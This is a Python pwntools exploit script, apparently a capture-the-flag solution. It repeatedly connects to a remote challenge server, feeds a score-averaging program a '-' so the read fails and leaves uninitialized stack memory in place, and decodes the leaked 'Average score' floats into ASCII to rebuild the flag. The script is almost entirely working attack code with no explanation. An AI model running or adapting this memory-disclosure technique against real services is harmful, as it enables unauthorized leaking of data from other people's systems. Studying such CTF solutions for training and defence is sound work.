#!/usr/bin/python3
from pwn import *
gs = '''
b vuln
continue
'''
elf = context.binary = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./chall', gdbscript=gs)
    if args.REMOTE:
        return remote('0.cloud.chals.io', 10198)
    else:
        return process('./chall')
r = start()
#========= exploit here ===================

def convert_leak(input_bytes):
    input_str = input_bytes.decode('utf-8')
    number = float(input_str)
    result = number * 20    
    int_result = int(result)    
    hex_result = hex(int_result)[2:]
    
    if len(hex_result) % 2 != 0:
        hex_result = '0' + hex_result
    
    byte_array = bytes.fromhex(hex_result)
    byte_array_reversed = byte_array[::-1]
    
    ascii_chars = []
    for byte in byte_array_reversed:
        char = chr(byte)
        if char.isprintable():
            ascii_chars.append(char)
        else:
            ascii_chars.append('?')  # Use '?' for non-printable characters
    
    return ''.join(ascii_chars)

leak_list = []

range1 = 4
range2 = 15

for j in range(15):

    r = remote('0.cloud.chals.io', 10198)
    log.info(f"interation {j}")

    score = 0

    for i in range(range1):
        r.sendlineafter(b"Enter score for player", f"{score}".encode('ascii'))

    r.sendlineafter(b"Enter score for player", b"-")
    #r.sendlineafter(b"Enter score for player", b"-")

    for i in range(range2):
        r.sendlineafter(b"Enter score for player", f"{score}".encode('ascii'))

    r.recvuntil(b"Average score is ")
    leak = r.recvline().strip()
    leak = leak[:-1]

    leak1 = convert_leak(leak)
    leak_list.append(leak1)
    log.info(f"leaking = {leak1}")

    range1 += 1
    range2 -= 1

    r.close()

log.info(f"flag = {''.join(leak_list)}")